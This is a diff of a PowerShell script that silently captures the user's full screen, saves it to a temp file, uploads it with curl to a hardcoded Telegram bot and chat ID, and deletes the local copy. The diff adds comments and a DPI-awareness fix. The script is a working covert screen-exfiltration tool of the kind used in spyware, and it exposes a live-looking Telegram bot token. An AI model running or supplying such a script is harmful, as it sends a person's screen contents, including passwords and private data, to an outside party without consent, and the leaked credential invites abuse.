@@ -1,24 +1,44 @@
-$BotToken = "8160534358:AAGKwhDjIS1xGFUCSBD7zU2pBH-YnfvKV_w"
+# --- CONFIGURATION ---
+# REPLACE with your NEW token from BotFather
+$BotToken = "8160534358:AAGKwhDjIS1xGFUCSBD7zU2pBH-YnfvKV_w" 
 $ChatId   = "2146236602"
+
+# --- LOAD ASSEMBLIES ---
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
+# --- FIX FOR ZOOMED/CROPPED IMAGES (DPI AWARENESS) ---
+# This block tells Windows: "I can handle high resolution, give me the full screen size."
+try {
+    $dpiAware = Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern bool SetProcessDPIAware();' -Name "Win32Utils" -Namespace System -PassThru
+    $dpiAware::SetProcessDPIAware()
+} catch {
+    # If the type is already added in the current session, just ignore the error.
+    Write-Verbose "DPI Awareness already set or type already exists."
+}
+
+# --- CAPTURE SCREENSHOT ---
+# Now VirtualScreen will return the real physical resolution (e.g., 1920x1080)
 $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
 $bmp = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
 $g = [System.Drawing.Graphics]::FromImage($bmp)
 
+# Capture the screen
 $g.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bmp.Size)
 
+# --- SAVE TO TEMP FILE ---
 $path = "$env:TEMP\screen.png"
 $bmp.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)
 
+# Clean up graphics resources immediately
 $g.Dispose()
 $bmp.Dispose()
 
+# --- SEND TO TELEGRAM ---
 & "$env:SystemRoot\System32\curl.exe" `
   -F "chat_id=$ChatId" `
   -F "document=@$path" `
   "https://api.telegram.org/bot$BotToken/sendDocument"
 
+# --- CLEANUP ---
 Remove-Item $path -Force
-
